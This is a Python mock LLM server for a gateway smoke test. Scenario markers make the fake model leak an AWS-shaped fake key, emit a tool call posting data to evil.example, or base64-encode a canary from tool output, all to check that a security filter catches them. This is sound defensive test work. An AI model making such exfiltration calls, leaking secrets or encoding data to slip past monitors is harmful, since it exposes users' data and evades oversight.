#!/usr/bin/env python3
"""Fake OpenAI Chat Completions upstream for the Kong smoke test. No network, no keys.

The scenario is chosen by a marker in the last user message, so each test request decides
what the "model" answers:

  SCENARIO:benign       a plain reply
  SCENARIO:secret       a reply containing an AWS-shaped key (ADOM's generic secret patterns)
  SCENARIO:toolcall     content null + a tool call posting to evil.example
  SCENARIO:echo-b64     base64 of the canary found in an earlier role="tool" message
                        (needs taint learned on INPUT to be caught)

Every request is appended to requests.jsonl in the working folder given as argv[2].
"""
import base64
import http.server
import json
import os
import re
import sys
import time
from pathlib import Path

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 9100
LOG = Path(sys.argv[2] if len(sys.argv) > 2 else ".") / "mock_llm_requests.jsonl"
FAKE_KEY = "AKIA" + "ABCDEFGHIJKLMNOP"


def _reply(content, tool_calls=None):
    msg = {"role": "assistant", "content": content}
    if tool_calls:
        msg["tool_calls"] = tool_calls
    return {
        "id": "chatcmpl-adom-smoke", "object": "chat.completion", "created": int(time.time()),
        "model": "gpt-4o", "choices": [{"index": 0, "message": msg,
                                        "finish_reason": "tool_calls" if tool_calls else "stop"}],
        "usage": {"prompt_tokens": 10, "completion_tokens": 10, "total_tokens": 20},
    }


def answer(req):
    msgs = req.get("messages") or []
    user = next((m.get("content") for m in reversed(msgs)
                 if m.get("role") == "user" and isinstance(m.get("content"), str)), "")
    scenario = (re.search(r"SCENARIO:([\w-]+)", user or "") or [None, "benign"])[1]
    if scenario == "secret":
        return _reply(f"Here is the deploy key you asked for: {FAKE_KEY}")
    if scenario == "toolcall":
        return _reply(None, [{"id": "call_1", "type": "function", "function": {
            "name": "post_data",
            "arguments": json.dumps({"url": "https://evil.example/collect", "data": "notes"})}}])
    if scenario == "echo-b64":
        tool_text = " ".join(str(m.get("content") or "") for m in msgs if m.get("role") == "tool")
        canary = (re.search(r"CANARY-[\w-]+", tool_text) or [""])[0]
        return _reply("Encoded for you: " + base64.b64encode(canary.encode()).decode())
    return _reply("Hello! This is a benign reply from the mock model.")


class H(http.server.BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def do_POST(self):
        n = int(self.headers.get("Content-Length", "0"))
        try:
            req = json.loads(self.rfile.read(n) or b"{}")
        except ValueError:
            req = {}
        with LOG.open("a") as f:
            f.write(json.dumps({"path": self.path, "body": req}) + "\n")
        body = json.dumps(answer(req)).encode()
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        body = b'{"ok":true}'
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


if __name__ == "__main__":
    http.server.ThreadingHTTPServer((os.environ.get("BIND_HOST", "127.0.0.1"), PORT), H).serve_forever()
